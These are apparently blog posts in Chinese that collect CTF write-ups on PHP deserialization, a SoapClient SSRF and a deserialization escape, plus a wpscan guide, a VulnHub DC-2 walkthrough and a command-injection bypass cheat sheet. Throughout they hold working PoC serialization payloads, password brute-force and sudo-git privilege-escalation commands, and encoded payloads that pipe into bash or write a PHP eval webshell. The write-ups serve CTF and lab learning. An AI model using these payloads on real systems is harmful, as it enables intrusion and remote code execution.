think\\process\\pipes;use think\\model\\concern\\Conversion;use think\\model\\Pivot;class Windows&#123; private $files = []; public function __construct() &#123; $this-&gt;files=[new Pivot()]; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;use think\\process\\pipes\\Windows;echo base64_encode(serialize(new Windows()));?&gt; 打了下 发现不大行 猜测可能中间有过滤或者修改断了 仔细看下源码发现 Profile.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&lt;?phpnamespace app\\web\\controller;use think\\Controller;class Profile extends Controller&#123; public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __construct() &#123; $this-&gt;checker=new Index(); $this-&gt;upload_menu=md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]); @chdir(&quot;../public/upload&quot;); if(!is_dir($this-&gt;upload_menu))&#123; @mkdir($this-&gt;upload_menu); &#125; @chdir($this-&gt;upload_menu); &#125; public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;; $this-&gt;update_img(); &#125;else&#123; $this-&gt;error(&#x27;Forbidden type!&#x27;, url(&#x27;../index&#x27;)); &#125; &#125;else&#123; $this-&gt;error(&#x27;Unknow file type!&#x27;, url(&#x27;../index&#x27;)); &#125; &#125; public function update_img()&#123; $user_info=db(&#x27;user&#x27;)-&gt;where(&quot;ID&quot;,$this-&gt;checker-&gt;profile[&#x27;ID&#x27;])-&gt;find(); if(empty($user_info[&#x27;img&#x27;]) &amp;&amp; $this-&gt;img)&#123; if(db(&#x27;user&#x27;)-&gt;where(&#x27;ID&#x27;,$user_info[&#x27;ID&#x27;])-&gt;data([&quot;img&quot;=&gt;addslashes($this-&gt;img)])-&gt;update())&#123; $this-&gt;update_cookie(); $this-&gt;success(&#x27;Upload img successful!&#x27;, url(&#x27;../home&#x27;)); &#125;else&#123; $this-&gt;error(&#x27;Upload file failed!&#x27;, url(&#x27;../index&#x27;)); &#125; &#125; &#125; public function update_cookie()&#123; $this-&gt;checker-&gt;profile[&#x27;img&#x27;]=$this-&gt;img; cookie(&quot;user&quot;,base64_encode(serialize($this-&gt;checker-&gt;profile)),3600); &#125; public function ext_check()&#123; $ext_arr=explode(&quot;.&quot;,$this-&gt;filename); $this-&gt;ext=end($ext_arr); if($this-&gt;ext==&quot;png&quot;)&#123; return 1; &#125;else&#123; return 0; &#125; &#125; public function __get($name) &#123; return $this-&gt;except[$name]; &#125; public function __call($name, $arguments) &#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125;&#125; 这里这个__call方法实现了动态调用 这里我们就可以调用upload_img方法进行写webshell 现在需要一个触发点 在Register.php 尝试构造poc 123456789101112131415161718192021222324252627282930313233&lt;?phpnamespace app\\web\\controller;class Register&#123; public $checker; public $registed; public function __construct() &#123; $this-&gt;registed = 0; $this-&gt;checker = new Profile(); &#125;&#125;class Profile&#123; public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __construct() &#123; $this-&gt;checker = 0; $this-&gt;ext =1; $this-&gt;filename_tmp = &#x27;./upload/d99081fe929b750e0557f85e6499103f/9b953dc860fe32586900485d0f11712c.png&#x27;; $this-&gt;filename = &#x27;./upload/mb1.php&#x27;; $this-&gt;except[&#x27;index&#x27;] = &#x27;upload_img&#x27;; // $this-&gt;index = &#x27;upload_img&#x27;; &#125;&#125;echo base64_encode(serialize(new Register)); 先注册登陆 上传图片马 反序列化利用copy函数将图片马改成php文件名 注意请求的路由时/index.php/upload 直接/upload会302跳转 bestphp’s revengewriteup源码： index.php 123456789101112&lt;?phphighlight_file(__FILE__);$b = &#x27;implode&#x27;;call_user_func($_GET[&#x27;f&#x27;], $_POST);session_start();if (isset($_GET[&#x27;name&#x27;])) &#123; $_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];&#125;var_dump($_SESSION);$a = array(reset($_SESSION), &#x27;welcome_to_the_lctf2018&#x27;);call_user_func($b, $a);?&gt; call_user_func回调函数可控 但是回调函数的参数是数组 貌似没什莫函数能直接rce吧 再继续看 后面就是参数session的 reset函数返回session第一项的值 再用call_user_func回调 同样 第二个参数仍是数组 数组第一个值可控 而回调函数可以使用extract函数变量覆盖掉 但是现在还是不能rce 还有个文件flag.php 1234567only localhost can get flag!session_start();echo &#39;only localhost can get flag!&#39;;$flag &#x3D; &#39;LCTF&#123;*************************&#125;&#39;;if($_SERVER[&quot;REMOTE_ADDR&quot;]&#x3D;&#x3D;&#x3D;&quot;127.0.0.1&quot;)&#123; $_SESSION[&#39;flag&#39;] &#x3D; $flag; &#125;only localhost can get flag! 可以看到只要ip来自127.0.0.1就把flag存到session里 看了下wp Session反序列化 + Soap 原生类 CRLF注入ssrf 三种反序列化的差别： php_binary： 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值 php： 键名＋竖线＋经过serialize()函数反序列处理的值，默认session序列化引擎 php_serialize： serialize()函数序列化方式 构造 1234&lt;?php$a = new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;http://127.0.0.1&#x27;, &#x27;location&#x27;=&gt;&#x27;http://127.0.0.1/flag.php&#x27;));$b = serialize($a);echo urlencode($b); 通过第一个call_user_func来调用session_start函数 并且设置序列化引擎 即 1serialize_handler&#x3D;php_serialize session_start会重用已有会话 尝试请求 将session的序列化引擎设置成php_serialize 此时序列化的内容为下面代码生成的 12345678&lt;?php$a = new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;http://127.0.0.1&#x27;, &#x27;location&#x27;=&gt;&#x27;http://127.0.0.1/flag.php&#x27;,&#x27;user_agent&#x27; =&gt; &quot;test\\r\\nCookie: PHPSESSID=fsmtr8fve84so1iug59m1ndsq1&quot;));$_SESSION[&#x27;name&#x27;] = serialize($a);echo serialize($_SESSION);/*a:1:&#123;s:4:&quot;name&quot;;s:206:&quot;O:10:&quot;SoapClient&quot;:4:&#123;s:3:&quot;uri&quot;;s:16:&quot;http://127.0.0.1&quot;;s:8:&quot;location&quot;;s:25:&quot;http://127.0.0.1/flag.php&quot;;s:11:&quot;_user_agent&quot;;s:50:&quot;testCookie: PHPSESSID=fsmtr8fve84so1iug59m1ndsq1&quot;;s:13:&quot;_soap_version&quot;;i:1;&#125;&quot;;&#125;*/ 接着请求 虽然504了实际已经成功 请求的时候会反序列化 用第二个call_user_func调用SoapClient类的welcome_to_the_lctf2018方法 该方法不存在 就会触发__call方法从而ssrf 最后请求 [安洵杯 2019]不是文件上传writeup查看源码看到 并且提示源码在github搜了下：https://github.com/Threezh1/wowouploadimage helper.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&lt;?phpclass helper &#123; protected $folder = &quot;pic/&quot;; protected $ifview = False; protected $config = &quot;config.txt&quot;; // The function is not yet perfect, it is not open yet. public function upload($input=&quot;file&quot;) &#123; $fileinfo = $this-&gt;getfile($input); $array = array(); $array[&quot;title&quot;] = $fileinfo[&#x27;title&#x27;]; $array[&quot;filename&quot;] = $fileinfo[&#x27;filename&#x27;]; $array[&quot;ext&quot;] = $fileinfo[&#x27;ext&#x27;]; $array[&quot;path&quot;] = $fileinfo[&#x27;path&#x27;]; $img_ext = getimagesize($_FILES[$input][&quot;tmp_name&quot;]); $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]); $array[&quot;attr&quot;] = serialize($my_ext); $id = $this-&gt;save($array); if ($id == 0)&#123; die(&quot;Something wrong!&quot;); &#125; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is $id.&lt;/p&gt;&quot;; &#125; public function getfile($input) &#123; if(isset($input))&#123; $rs = $this-&gt;check($_FILES[$input]); &#125; return $rs; &#125; public function check($info) &#123; $basename = substr(md5(time().uniqid()),9,16); $filename = $info[&quot;name&quot;]; $ext = substr(strrchr($filename, &#x27;.&#x27;), 1); $cate_exts = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;); if(!in_array($ext,$cate_exts))&#123; die(&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;); &#125; $title = str_replace(&quot;.&quot;.$ext,&#x27;&#x27;,$filename); return array(&#x27;title&#x27;=&gt;$title,&#x27;filename&#x27;=&gt;$basename.&quot;.&quot;.$ext,&#x27;ext&#x27;=&gt;$ext,&#x27;path&#x27;=&gt;$this-&gt;folder.$basename.&quot;.&quot;.$ext); &#125; public function save($data) &#123; if(!$data || !is_array($data))&#123; die(&quot;Something wrong!&quot;); &#125; $id = $this-&gt;insert_array($data); return $id; &#125; public function insert_array($data) &#123; $con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;pic_base&quot;); if (mysqli_connect_errno($con)) &#123; die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error()); &#125; $sql_fields = array(); $sql_val = array(); foreach($data as $key=&gt;$value)&#123; $key_temp = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;\\0\\0\\0&#x27;, $key); $value_temp = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;\\0\\0\\0&#x27;, $value); $sql_fields[] = &quot;`&quot;.$key_temp.&quot;`&quot;; $sql_val[] = &quot;&#x27;&quot;.$value_temp.&quot;&#x27;&quot;; &#125; $sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;; mysqli_query($con, $sql); $id = mysqli_insert_id($con); mysqli_close($con); return $id; &#125; public function view_files($path)&#123; if ($this-&gt;ifview == False)&#123; return False; //The function is not yet perfect, it is not open yet. &#125; $content = file_get_contents($path); echo $content; &#125; function __destruct()&#123; # Read some config html $this-&gt;view_files($this-&gt;config); &#125;&#125;?&gt; show.php 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpinclude(&quot;./helper.php&quot;);$show = new show();if($_GET[&quot;delete_all&quot;])&#123; if($_GET[&quot;delete_all&quot;] == &quot;true&quot;)&#123; $show-&gt;Delete_All_Images(); &#125;&#125;$show-&gt;Get_All_Images();class show&#123; public $con; public function __construct()&#123; $this-&gt;con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;pic_base&quot;); if (mysqli_connect_errno($this-&gt;con))&#123; die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error()); &#125; &#125; public function Get_All_Images()&#123; $sql = &quot;SELECT * FROM images&quot;; $result = mysqli_query($this-&gt;con, $sql); if ($result-&gt;num_rows &gt; 0)&#123; while($row = $result-&gt;fetch_assoc())&#123; if($row[&quot;attr&quot;])&#123; $attr_temp = str_replace(&#x27;\\0\\0\\0&#x27;, chr(0).&#x27;*&#x27;.chr(0), $row[&quot;attr&quot;]); $attr = unserialize($attr_temp); &#125; echo &quot;&lt;p&gt;id=&quot;.$row[&quot;id&quot;].&quot; filename=&quot;.$row[&quot;filename&quot;].&quot; path=&quot;.$row[&quot;path&quot;].&quot;&lt;/p&gt;&quot;; &#125; &#125;else&#123; echo &quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;; &#125; mysqli_close($this-&gt;con); &#125; public function Delete_All_Images()&#123; $sql = &quot;DELETE FROM images&quot;; $result = mysqli_query($this-&gt;con, $sql); &#125;&#125; 明显反序列化字符逃逸 upload.php 12345678910111213141516171819&lt;?phpinclude(&quot;./helper.php&quot;);class upload extends helper &#123; public function upload_base()&#123; $this-&gt;upload(); &#125;&#125;if ($_FILES)&#123; if ($_FILES[&quot;file&quot;][&quot;error&quot;])&#123; die(&quot;Upload file failed.&quot;); &#125;else&#123; $file = new upload(); $file-&gt;upload_base(); &#125;&#125;$a = new helper();?&gt;","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"代码审计","slug":"代码审计","permalink":"http://www.moonback.xyz/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"buuctf","slug":"buuctf","permalink":"http://www.moonback.xyz/tags/buuctf/"}]},{"title":"wpscan学习使用","slug":"wpscan学习使用","date":"2020-01-11T08:47:41.000Z","updated":"2020-01-16T08:04:31.107Z","comments":true,"path":"2020/01/11/wpscan学习使用/","link":"","permalink":"http://www.moonback.xyz/2020/01/11/wpscan%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/","excerpt":"本篇博客主要介绍了wordpress漏洞扫描工具wpscan的使用!","text":"本篇博客主要介绍了wordpress漏洞扫描工具wpscan的使用! 什么是wpscan?介绍wpscan之前应该先介绍一下wordpress! Wordpress作为三大建站模板之一，在全世界范围内有大量的用户,这也导致白帽子都会去跟踪 WordPress的安全问题，Wordpress自诞生起出现了很多漏洞，同样部分插件、主题也存在漏洞。于是WPScan应运而生，收集 Wordpress的各种漏洞，形成一个Wordpress专用扫描器。 该扫描器可以实现获取站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的Wordpress站点暴力破解用户名密码。 kali里默认集成该工具 使用基本操作12wpscan --update #更新漏洞库wpscan -h #查看帮助信息 站点扫描1wpscan --url [wordpress url] #对wordpress站点扫描 枚举用户12wpscan --url [wordpress url] --enumerate u #枚举用户列表，--enumerate可用-u代替wpscan --url [wordpress url] -P [path to wordlist] -U [username to brute force] #暴力破解指定用户名的密码，可加-t指定线程,--rua随机UA头 枚举主题123wpscan --url [wordpress url] --enumerate t #扫描主题wpscan --url [wordpress url] --enumerate vt #扫描主题漏洞wpscan --url [wordpress url] --enumerate at #扫描所有主题 枚举插件123wpscan --url [wordpress url] --enumerate p #扫描插件wpscan --url [wordpress url] --enumerate vp #扫描插件漏洞wpscan --url [wordpress url] --enumerate ap #扫描所有插件","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"wpscan","slug":"wpscan","permalink":"http://www.moonback.xyz/tags/wpscan/"},{"name":"wordpress","slug":"wordpress","permalink":"http://www.moonback.xyz/tags/wordpress/"}]},{"title":"VulnHub之DC-2靶机","slug":"vulnhub-dc-2","date":"2020-01-01T14:07:31.000Z","updated":"2020-01-12T10:20:10.460Z","comments":true,"path":"2020/01/01/vulnhub-dc-2/","link":"","permalink":"http://www.moonback.xyz/2020/01/01/vulnhub-dc-2/","excerpt":"本篇博客主要介绍了玩DC-2靶机的过程!","text":"本篇博客主要介绍了玩DC-2靶机的过程! kali：192.168.17.146 靶机：192.168.17.131 flag1这个靶机需要将dc-2的域名指向对应靶机ip 首先arp-scan 改下/etc/hosts文件 直接访问dc-2域名，得到flag1 flag2flag1提示用cewl生成字典爆破就会看到下一个flag，首先枚举一下用户，枚举出三个用户 1wpscan --url http://dc-2/ -e u 用cewl生成字典，cewl有很多用法，参见https://www.freebuf.com/articles/network/190128.html 1cewl http://dc-2 -w a.txt 然后用wpscan爆破，分别将用户名和密码放到两个文件里 1wpscan --url http://dc-2 --passwords /root/Desktop/a.txt --usernames /root/Desktop/b.txt -t 100 跑出来两个账号密码，登陆一下,找到flag2 flag3nmap扫描主机发现7744端口开放着服务，探测服务是ssh，登陆试一下吧 登陆jerry好像登不上，换成tom登上了，ls看到flag3.txt 发现cat不了，rbash是一种受限制的shell，受限制的shell是限制了一个shell的部分命令,像cd、ls、echo,或者是限制了一些环境变量,诸如SHELL、PATH、USER。或者限制一些输出符,像&gt;、&gt;&gt;等 因此，想办法切换一下shell 123BASH_CMDS[a]=/bin/sh;a #切换shellexport PATH=$PATH:/bin/ #添加$PATH，cat和su都在/bin下export PATH=$PATH:/usr/bin #sudo在/usr/bin下 flag4从flag3可以看出来，flag4应该在jerry用户home里 thefinalflagflag4提示我们用git，切换用户发现jerry可以直接使用git 12sudo git -p --help #查看帮助信息!/bin/bash","categories":[],"tags":[{"name":"VulnHub","slug":"VulnHub","permalink":"http://www.moonback.xyz/tags/VulnHub/"},{"name":"靶机","slug":"靶机","permalink":"http://www.moonback.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"命令注入及其绕过方式","slug":"command-exec-bypass","date":"2019-12-31T02:30:56.000Z","updated":"2020-01-16T10:04:04.594Z","comments":true,"path":"2019/12/31/command-exec-bypass/","link":"","permalink":"http://www.moonback.xyz/2019/12/31/command-exec-bypass/","excerpt":"本篇博客主要介绍了命令注入中的一些绕过方式！","text":"本篇博客主要介绍了命令注入中的一些绕过方式！ 特殊符号|管道符，连结上个指令的标准输出，做为下个指令的标准输入 &amp;用户有时候执行命令要花很长时间，可能会影响做其他事情。最好的方法是将它放在后台执行。后台运行的程序在用户注销后系统还可以继续执行。当要把命令放在后台执行时，在命令的后面加上&amp; &amp;&amp;和||shell在执行某个命令的时候，会返回一个返回值，该返回值保存在shell变量 $? 中。当 $? == 0 时，表示执行成功；当 $? == 1 时，表示执行失败。有时候，下一条命令依赖前一条命令是否执行成功。如：在成功地执行一条命令之后再执行另一条命令，或者在一条命令执行失败后再执行另一条命令等。shell提供了&amp;&amp;和||来实现命令执行控制的功能，shell将根据&amp;&amp;或||前面命令的返回值来控制其后面命令的执行 &amp;&amp;1command1 &amp;&amp; command2 [&amp;&amp; command3 ...] 命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。 只有在&amp;&amp;左边的命令返回真（命令返回值 $? == 0），&amp;&amp;右边的命令才会被执行 只要有一个命令返回假（命令返回值 $? == 1），后面的命令就不会被执行 ||1command1 || command2 [|| command3 ...] 命令之间使用 || 连接，实现逻辑或的功能。 只有在 || 左边的命令返回假（命令返回值 $? == 1），||右边的命令才会被执行。这和c语言中的逻辑或语法功能相同，即实现短路逻辑或操作。 只要有一个命令返回真（命令返回值 $? == 0），后面的命令就不会被执行。 `反引号命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项 ‘单引号被单引号括住的内容,将被视为单一字符串。在引号内的变量$符号将会失效，也就是说，将被视作一般符号处理。 “双引号被双引号括住的内容，将被视为单一字符串，防止通配符的扩展，但允许变量扩展 ，这点与单引号的处理方式不同 ()指令群组格式为：(command1;command2[;command3…]) 一条命令需要独占一个物理行，如果需要将多条命令放在同一行，命令之间使用命令分隔符（;）分隔。执行的效果等同于多个独立的命令单独执行的效果。 表示在当前 shell 中将多个命令作为一个整体执行。需要注意的是，使用 () 括起来的命令在执行前面都不会切换当前工作目录，也就是说命令组合都是在当前工作目录下被执行的，尽管命令中有切换目录的命令。 命令组合常和命令执行控制结合起来使用。 用括号将一串连续指令括起来，这种用法对shell来说，称为指令群组。如下面的例子: 1(cd ~ ; vcgh=`pwd` ;echo $vcgh) {}大括号其实大括号有一种拼接字符串的用法，&#123;xx,yy,zz,...&#125;这种大括号的组合，常用在字串的组合上，来看个例子 1mkdir &#123;userA,userB,userC&#125;-&#123;home,bin,data&#125; 我们得到userA-home, userA-bin, userA-data, userB-home, userB-bin,userB-data, userC-home, userC-bin,userC-data文件夹。 于是我们可以用来查看flag: 12345$ cat &#123;/fl,/fla&#125;&#123;ag,g&#125;flag&#123;xxx&#125;cat: /flg: No such file or directorycat: /flaag: No such file or directoryflag&#123;xxx&#125; []中括号这个符号在正则表达式中担任类似 “范围” 或 “集合” 的角色。 小括号，中括号，和大括号的区别那么，下面又涉及到了一个问题，就是小括号，中括号，和大括号的区别。 单小括号，(cmd1;cmd2;cmd3) 新开一个子shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后可以没有分号。把command group放在subshell去执行，也叫做nested sub-shell。 单大括号，{ cmd1;cmd2;cmd3;} 在当前shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后必须有分号, 第一条命令和左括号之间必须用空格隔开。花括号是在同一个 shell 內完成，也称为 non-namedcommand group。 所以说，如果在shell里面执行“函数”，需要用到{}，实际上也就是一个命令群组么。不过，根据实测，test=$(ls -a)可以执行，但是test=$&#123;ls–a&#125;语法上面是有错误的。估计也和上面所说的原因有关。 另外，从网上摘录的区别如下： ()只是对一串命令重新开一个子shell进行执行 {}对一串命令在当前shell执行 ()和{}都是把一串的命令放在括号里面，并且命令之间用;号隔开 ()最后一个命令可以不用分号 {}最后一个命令要用分号 {}的第一个命令和左括号之间必须要有一个空格 ()里的各命令不必和括号有空格 ()和{}中括号里面的某个命令的重定向只影响该命令，但括号外的重定向则影响到括号里的所有命令 这里引出来[..]和[[...]]的区别：使用[[...]]条件判断结构, 而不是[...], 能够防止脚本中的许多逻辑错误.比如&amp;&amp;,||,&lt;,和&gt; 操作符能够正常存在于[[ ]]条件判断结构中, 但是如果出现在[]结构中的话，会报错。 对&#123;&#125;和()而言, 括号中的重定向符只影响该条命令， 而括号外的重定向符影响到括号中的所有命令。 输入输出/重定向1&gt; &gt;&gt; &lt; &lt;&lt; :&gt; &amp;&gt; 2&amp;&gt; 2&lt;&gt;&gt;&amp; &gt;&amp;2 文件描述符(File Descriptor)，用一个数字（通常为0-9）来表示一个文件。 文件描述符 名称 常用缩写 默认值 0 标准输入 stdin 键盘 1 标准输出 stdout 屏幕 2 标准错误输出 stderr 屏幕 我们在简单地用&lt;或&gt;时，相当于使用0&lt;或1&gt;（下面会详细介绍）。 cmd &gt; file把cmd命令的输出重定向到文件file中。如果file已经存在，则清空原有文件，使用bash的noclobber选项可以防止复盖原有文件。 cmd &gt;&gt; file把cmd命令的输出重定向到文件file中，如果file已经存在，则把信息加在原有文件后面。 cmd &lt; file使cmd命令从file读入 cmd &lt;&lt; text从命令行读取输入，直到一个与text相同的行结束。除非使用引号把输入括起来，此模式将对输入内容进行shell变量替换。如果使用&lt;&lt;- ，则会忽略接下来输入行首的tab，结束行也可以是一堆tab再加上一个与text相同的内容，可以参考後面的例子。 cmd &lt;&lt;&lt; word把word（而不是文件word）和后面的换行作为输入提供给cmd。 cmd &lt;&gt; file以读写模式把文件file重定向到输入，文件file不会被破坏。仅当应用程序利用了这一特性时，它才是有意义的。 cmd &gt;| file功能同&gt;，但即便在设置了noclobber时也会复盖file文件，注意用的是|而非一些书中说的!，目前仅在csh中仍沿用&gt;!实现这一功能。 : &gt; filename 把文件filename截断为0长度。如果文件不存在, 那么就创建一个0长度的文件(与touch的效果相同). cmd &gt;&amp;n 把输出送到文件描述符n cmd m&gt;&amp;n 把输出到文件符m的信息重定向到文件描述符n cmd &gt;&amp;- 关闭标准输出 cmd &lt;&amp;n 输入来自文件描述符n cmd m&lt;&amp;n m来自文件描述各个n cmd &lt;&amp;- 关闭标准输入 cmd &lt;&amp;n- 移动输入文件描述符n而非复制它。 cmd &gt;&amp;n- 移动输出文件描述符n而非复制它。注意： &gt;&amp;实际上复制了文件描述符，这使得cmd &gt; file 2&gt;&amp;1与cmd 2&gt;&amp;1 &gt;file的效果不一样。 通配符还有一类通配符，首先先了解下什么是Linux shell通配符/glob模式: glob 模式（globbing）也被称之为 shell 通配符，名字的起源来自于 Unix V6 中的 /etc/glob （详见 man 文档）。glob 是一种特殊的模式匹配，最常见的是通配符拓展，也可以将 glob 模式设为精简了的正则表达式，在最新的 CentOS 7 中已经删除了 glob 的相关描述文档，删除的原因由于 glob 已经整合到了 shell 之中，然后就有了 shell 通配符。shell 通配符 / glob 模式通常用来匹配目录以及文件，而不是文本！！！ 语法 字符 解释 * 匹配任意长度任意字符 ? 匹配任意单个字符 [list] 匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合 [^list] 匹配指定范围外的任意单个字符或字符集合 [!list] 同[^list] {str1,str2,…} 匹配 srt1 或者 srt2 或者更多字符串，也可以是集合 IFS 由 &lt; space &gt; 或 &lt; tab &gt; 或 &lt; enter &gt; 三者之一组成 CR 由 &lt; enter &gt; 产生 ! 执行 history 中的命令 以及还有专用字符集 字符 意义 [:alnum:] 任意数字或者字母 [:alpha:] 任意字母 [:space:] 空格 [:lower:] 小写字母 [:digit:] 任意数字 [:upper:] 任意大写字母 [:cntrl:] 控制符 [:graph:] 图形 [:print:] 可打印字符 [:punct:] 标点符号 [:xdigit:] 十六进制数 [:blank:] 空白字符 在使用专属字符集的时候，字符集之外还需要用 [ ] 来包含住，否则专用字符集不会生效，例如[[:space:]] 想要转义的时候，单引号与双引号使用方法是不同的，单引号会转义所有字符，而且单引号中间不允许再出现单引号，双引号允许出现特定的 shell 元字符，具体字符可以自行查询 在使用花括号 {} 的时候，里面的单个字符串需要使用单引号或者双引号括住，否则就会视为多个的单个字符 命令执行的一些绕过技巧1. 空格绕过空格可以用以下字符串代替： 1&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS等 $IFS在linux下表示分隔符，但是如果单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。 2.一些命令分隔符12linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符） 1、在 shell 中，担任”连续指令”功能的符号就是”;”2、”&amp;” 放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。3、管道符”|”左边命令的输出就会作为管道符右边命令的输入，所以左边的输出并不显示 3.花括号的别样用法在Linux bash中还可以使用&#123;OS_COMMAND,ARGUMENT&#125;来执行系统命令 4.黑名单绕过拼接绕过比如：a=l;b=s;$a$b上面的第二道题目也是利用偶读拼接方法绕过黑名单：a=fl;b=ag;cat $a$b 编码绕过base64： 12echo MTIzCg==|base64 -d 其将会打印123echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash ==&gt;cat /flag hex： 1echo &quot;636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag oct： 12345$(printf &quot;\\154\\163&quot;) ==&gt;ls$(printf &quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;) ==&gt;cat /flag&#123;printf,&quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;&#125;|\\$0 ==&gt;cat /flag#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;$&#123;printf,&quot;\\74\\77\\160\\150\\160\\40\\100\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\143\\47\\135\\51\\73\\77\\76&quot;&#125; &gt;&gt; 1.php 单引号和双引号绕过比如：ca&#39;&#39;t flag 或ca&quot;&quot;t flag 反斜杠绕过比如：ca\\t fl\\ag 利用Shell 特殊变量绕过 变量 含义 $0 当前脚本的文件名 $n 传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空 $# 传递给脚本或函数的参数个数 $$ 当前shell进程ID $* 传递给脚本或函数的所有参数，而参数不存在时其值为空 $@ 传递给脚本或函数的所有参数。，而参数不存在时其值为空。被双引号包函时，与$*稍有不同 $? 上个命令的推出状态，或函数的返回值 linux shell中$n表示传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。$@表示比如：ca$@t fla$@gca$1t fla$2g 5.长度限制长度限制可以用文件构造的方式来绕过。 123linux下可以用 1&gt;a创建文件名为a的空文件ls -t&gt;test则会将目录按时间排序后写进test文件中sh命令可以从一个文件中读取命令来执行 6.内联执行命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。例如： 1echo &quot;a`pwd`&quot; 类似的还有$(command).例如： 1echo “abcd $(pwd)” 7.通配符上面已经记过 参考： https://blog.zeddyu.info/2019/01/17/命令执行/ https://blog.csdn.net/silence1_/article/details/96135760 